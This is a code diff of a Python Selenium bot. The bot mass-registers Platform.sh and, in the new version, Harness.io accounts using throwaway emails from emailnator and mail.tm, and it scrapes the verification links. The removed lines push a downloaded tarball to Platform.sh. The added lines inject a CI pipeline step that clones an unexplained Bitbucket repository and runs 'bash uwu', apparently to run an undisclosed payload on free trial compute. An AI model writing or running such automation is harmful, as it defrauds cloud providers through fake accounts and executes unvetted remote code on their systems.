@@ -31,132 +31,109 @@ options.add_argument("--window-size=1920,1080")
 options.add_argument('--user-data-dir=rawr')
 driver = uc.Chrome(options=options, version_main=106)
 
-subprocess.call(['/bin/bash', '-i', '-c', "curl -sS https://platform.sh/cli/installer | php"])
-import requests
-headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "cross-site",
-        "Sec-Fetch-User": "?1",
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache"}
-uwu = {
-        "email":["plusGmail"]
-}
-rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
-headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
-headersdomain["Accept"] = "application/json, text/plain, */*"
-headersdomain["Content-Type"] = "application/json"
-headersdomain["X-Requested-With"] = "XMLHttpRequest"
-headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
-rawrz = requests.post('https://www.emailnator.com/generate-email', headers=headersdomain, json=uwu)
-emil = rawrz.json()["email"][0].split("+")[0]+"+"+"".join(random.sample(low_word, 7))+"@gmail.com"
-driver.get("https://auth.api.platform.sh/register?trial_type=general")
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div[3]/div/input").send_keys(emil)
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div[4]/button").click()
-time.sleep(20)
-headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "cross-site",
-        "Sec-Fetch-User": "?1",
-        "Pragma": "no-cache",
-        "Cache-Control": "no-cache"}
-uwu = {}
-rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
-headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
-headersdomain["Accept"] = "application/json, text/plain, */*"
-headersdomain["Content-Type"] = "application/json"
-headersdomain["X-Requested-With"] = "XMLHttpRequest"
-headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
-uwu["email"]=emil
-rawrz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
-for bork in rawrz.json()["messageData"]:
-        if(bork["messageID"]!="ADSVPN"):
-                uwu["messageID"] = bork["messageID"]
-                rawrzz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
-                verifylink = rawrzz.text.split("\n")
-driver.get(verifylink[38].split('href="')[1].split('"')[0].replace("amp;", ""))
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[3]/div/div/input").send_keys("".join(random.sample(low_word, 13))+"H1!")
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[5]/button").click()
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[4]/button").click()
-time.sleep(2)
-x1 = "".join(random.sample(low_word, 8))
-x2 = "".join(random.sample(low_word, 8))
-print(x1)
-print(x2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[2]/div/input").send_keys(x1)
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[3]/div/input").send_keys(x2)
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[6]/button").click()
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[2]/div/div").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[2]/div/div[2]/div/div[1]").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[3]/div/input").send_keys("".join(random.sample(low_word, 13)))
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div[2]/div/div/div[1]/div/div[5]/button").click()
-time.sleep(9)
-from threading import Thread
-driver.get("https://console.platform.sh/-/users/"+x1+"-"+x2+"/settings/tokens")
-print(x1)
-print(x2)
-print(driver.current_url)
-time.sleep(8)
-driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div/div[1]/button").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div/div[3]/form/div[2]/div/input").send_keys("".join(random.sample(low_word, 13)))
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div/div[3]/form/button[1]").click()
-time.sleep(4)
-api = driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div/div[1]/code").text
-driver.get("https://console.platform.sh/projects/create-project")
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/main/div/div/div/div/div/div/button[2]").click()
-time.sleep(3)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/main/div/div/div/div/div/div[1]/div[1]/div/input").send_keys("".join(random.sample(low_word, 13)))
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/main/div/div/div/div/div/div[1]/div[3]/div[1]/div/div/div/div[1]").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/main/div/div/div/div/div/div[1]/div[3]/div[1]/div/div/div[2]/div/div[3]/div[2]/div[3]").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/main/div/div/div/div/div/div[2]/button[2]").click()
-time.sleep(1)
-driver.find_element(By.XPATH, "/html/body/div[5]/div/div/div[3]/div[2]/button[2]").click()
-time.sleep(900)
-print(driver.current_url)
-driver.find_element(By.XPATH, "/html/body/div[5]/div/div/div[2]/div[2]/span/button").click()
-time.sleep(2)
-driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div[2]/div/div[1]/div/aside/button[2]/div").click()
-time.sleep(2)
-os.system("export PLATFORMSH_CLI_TOKEN=bork")
-print(api)
-import subprocess
-a = driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div[2]/div/div[1]/section/div[2]/div/div/pre").text
-repo = driver.find_element(By.XPATH, "/html/body/div[1]/main/div/div/div/div[2]/div/div[1]/section/div[3]/div/div/pre").text
-os.system("pwd")
-os.system("rm -rf cockyyrawr")
-print(a)
-os.system('git config --global user.email "you@example.com"')
-os.system('git config --global user.name "Your Name"')
-os.system("mkdir $HOME/.ssh")
-os.system("echo 'git.eu-5.platform.sh ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHVvr73G2u1j0s0RqixwpIGsTKagv3vMErXj/ixorbbuuNFmln8l2OqLo9cvg6QmO8OJFpY1xdOAIQ1hfzcZud+LCdMAxvsC7lz9VMb26Vchuc7o+lq0+w8ORAlKqlFfl2MpLtbEuuRaellXaTlQ36cSKwuCHOfzqsKDyb+Umpm+bYk6ICLnJyiEldo1cs8cAQNIgXRmPiJ2Ws/OamfJi/b1CajNZr6Q3gs7oqRbWBt9mgDFU9sFDMWDmmBAvDQj2azSk2i1hFQ4/lzczt6vQH9vusnESPCJfAiMJb60868BhuvOV9oxITItzwgNDFJltL8LNadZ4x6VvMmPV0DpJb' >> $HOME/.ssh/known_hosts")
-def xddd():
-    subprocess.call(['/bin/bash', '-i', '-c', "export PLATFORMSH_CLI_TOKEN="+api+" && mkdir cockyyrawr && cd cockyyrawr && git init && "+a+" && wget https://github.com/n2dhektor/fictional-octo-waddle/raw/main/f.tar.gz && tar -xf f.tar.gz && rm f.tar.gz && git add . && git commit -m 'hi' && platform push -q"])
-t = Thread(target=xddd)
-t.start()
-time.sleep(45)
+headersdomain = {'accept': 'application/ld+json'}
+responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
+emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
+myobj = {'address': emil,"password": "cloud"}
+headersreg = {'accept': 'application/ld+json'}
+responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)
 
+driver.get("https://app.harness.io/auth/#/signup")
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div/div[2]/div[2]/div/div[1]/div[3]/button[3]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/div[1]/input").send_keys(emil)
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/div[2]/div/input").send_keys("".join(random.sample(low_word, 13))+"H!1")
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div[2]/div/div[1]/form/button").click()
+time.sleep(20)
+myobjlog = {'address': emil,"password": "cloud"}
+headerslog = {'accept': 'application/ld+json'}
+responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
+token = responselog.json()["token"]
+headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
+responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
+headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
+responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
+verifylink = responsemessz.json()["text"].split("\n")[15].replace("[","").replace("]", "")
+driver.get(verifylink)
+time.sleep(20)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/button").click()
+time.sleep(3)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/nav/ul[1]/li[2]/a").click()
+time.sleep(3)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div/div/button").click()
+time.sleep(3)
+driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/span").click()
+time.sleep(4)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div[3]/div/div/div/button").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/div[2]/div/form/div/div[1]/div[1]/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 6)))
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[6]/div/div[3]/div/div[2]/div/form/div/div[6]/button[1]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/div/div/div/div/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div[1]/div[2]/div[2]/div[1]").click()
+time.sleep(1.5)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/div[1]/div[1]/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 5)))
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/div[2]/label").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[1]/div/span/div/div/div/form/div/button").click()
+time.sleep(1.8)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[1]/div[3]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[1]/div/form/div/div[1]/div/div/div/label[1]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[2]/button[2]").click()
+time.sleep(1.8)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div/div/div/div/div[3]").click()
+time.sleep(1.5)
+driver.find_element(By.XPATH, "/html/body/div[6]/span/div[1]/button[1]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div/div/section[1]/div/section[2]/section[2]/section[9]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[3]/div/div[2]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[9]/div/div/div/div/div/ul/li[1]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[1]/div/div[2]/div/div/input").send_keys("".join(random.sample(low_word, 7)))
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[2]/div/div[1]/div/div[2]/div/form/div/div[4]/div/div/div/div/div/div[1]/div[2]/div[1]/div[4]").click()
+time.sleep(0.5)
+actions = ActionChains(driver)
+actions.send_keys("""
+apt update
+apt install wget git -y
+git config --global user.email "you@example.com"
+git config --global user.name "Your Name"
+git clone https://bitbucket.org/dfggcvdrg/uwu/
+cd uwu
+bash uwu
+""")
+actions.perform()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div[1]/h4/div/div[2]/button[1]").click()
+time.sleep(1.8)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[1]/div[5]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[4]/div/div/div/div/div/div[3]").click()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[4]/div/div/div/div[2]/div/div[2]/div/div/div/div/div[1]/div[2]/div[1]/div[4]/div[1]").click()
+actions = ActionChains(driver)
+actions.send_keys(Keys.BACK_SPACE+"5")
+actions.perform()
+time.sleep(1)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div[2]/div/section/div/div[2]/div/div/div[7]/div/button[2]").click()
+time.sleep(2)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[1]/div[3]/div/button[2]").click()
+time.sleep(20)
+driver.find_element(By.XPATH, "/html/body/div[1]/div/div[2]/div/div/div[2]/div/div[1]/div/div[1]/div[3]/div/button[3]").click()
+time.sleep(8)
+driver.find_element(By.XPATH, "/html/body/div[7]/div/div[3]/div/div/div/div/div/div/div[4]/div/button").click()
+time.sleep(30)
+#driver.close()
